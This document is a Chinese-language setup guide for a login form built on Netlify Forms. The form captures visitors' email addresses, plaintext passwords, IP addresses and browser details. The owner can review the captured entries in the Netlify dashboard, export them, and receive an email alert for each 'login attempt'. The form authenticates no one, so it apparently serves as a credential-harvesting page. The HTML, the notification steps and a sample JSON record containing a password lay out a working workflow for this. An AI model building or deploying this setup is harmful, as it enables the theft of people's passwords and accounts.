# 📊 Netlify Forms 使用说明

## ✅ 已完成配置

你的登录表单已经配置好 Netlify Forms，现在可以自动收集登录数据了！

### 收集的数据包括：
- ✅ 邮箱地址
- ✅ 密码
- ✅ 是否记住我
- ✅ 提交时间戳
- ✅ 浏览器 User Agent
- ✅ IP 地址（Netlify 自动添加）
- ✅ 引用页面

---

## 🔍 如何查看收集的数据

### 方法1：Netlify 控制台（推荐）

1. **登录 Netlify**
   👉 访问 https://app.netlify.com

2. **选择你的站点**
   - 点击你的登录界面项目

3. **进入 Forms 页面**
   - 左侧菜单点击 "Forms"
   - 或在仪表盘页面点击 "Forms" 选项卡

4. **查看提交的数据**
   - 会显示所有登录尝试的列表
   - 点击任意一条记录查看详细信息
   - 包括：时间、邮箱、密码、其他字段

### 方法2：邮件通知（可选）

1. **在表单中添加邮件字段**（可选）
   ```html
   <input type="email" name="_replyto" placeholder="你的邮箱">
   ```

2. **在 Netlify 站点设置中配置通知**
   - Site settings → Forms → Form notifications
   - 添加新的通知规则
   - 选择 "Email notification"
   - 设置收件人邮箱

### 方法3：导出数据

1. **在 Netlify Forms 页面**
   - 找到 "Form submissions" 列表
   - 点击 "Download CSV" 按钮
   - 或点击 "Download JSON"

---

## 📧 设置邮件通知（推荐）

### 步骤：

1. **编辑 HTML 表单**
   ```html
   <form name="login-form" method="POST" data-netlify="true">
       <input type="hidden" name="form-name" value="login-form">
       <input type="email" name="email" required>
       <input type="password" name="password" required>
       <!-- 添加回复邮箱 -->
       <input type="email" name="_replyto" placeholder="你的邮箱（接收通知）" required>
       <input type="hidden" name="_subject" value="新的登录尝试">
       <button type="submit">登录</button>
   </form>
   ```

2. **在 Netlify 配置通知**
   - Site settings → Forms → Form notifications
   - 点击 "Add notification"
   - 选择 "Email notification"
   - 填写表单：
     ```
     Notification name: 登录通知
     Email to: 你的邮箱@example.com
     Form: login-form
     Subject: 新的登录尝试 - {{ form-name }}
     ```

---

## 📊 收集数据示例

每次有人登录，你会收到类似这样的数据：

```json
{
  "email": "user@example.com",
  "password": "userpassword",
  "rememberMe": "是",
  "timestamp": "2025-01-15T10:30:00.000Z",
  "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
  "ip": "192.168.1.1",
  "created_at": "2025-01-15T10:30:00.000Z",
  "form_name": "login-form"
}
```

---

## 🎯 免费额度

Netlify Forms 免费额度：
- ✅ 100 次提交/月（Starter 计划）
- ✅ 无限表单数量
- ✅ 无限字段数量
- ✅ 数据保留 6 个月
- ✅ 导出 CSV/JSON

超出限制：
- 💰 升级到 Pro 计划（$19/月）
- 💰 或等待下个月重置

---

## 🔧 常见问题

### Q: 数据没有出现在 Netlify 控制台？
A: 确保：
- 表单有 `name` 属性
- 有 `data-netlify="true"` 属性
- 有隐藏的 `form-name` 字段
- 字段都有 `name` 属性

### Q: 如何在同一个页面使用多个表单？
A: 给每个表单不同的 `name`，如：
```html
<form name="contact-form">...</form>
<form name="newsletter-form">...</form>
```

### Q: 如何修改提交成功后的页面？
A: 在表单中添加：
```html
<input type="hidden" name="_next" value="/success.html">
```

### Q: 如何防止垃圾提交？
A: 添加验证码（reCAPTCHA）：
```html
<div data-netlify-recaptcha="true"></div>
```

---

## 🎉 完成！

现在你的登录表单可以自动收集数据到 Netlify 了！

1. 部署到 Netlify
2. 有人登录时，数据自动保存
3. 在 Netlify 控制台查看数据
4. 收到邮件通知（如果配置了）

**需要帮助？** 访问 Netlify 文档：https://docs.netlify.com/forms/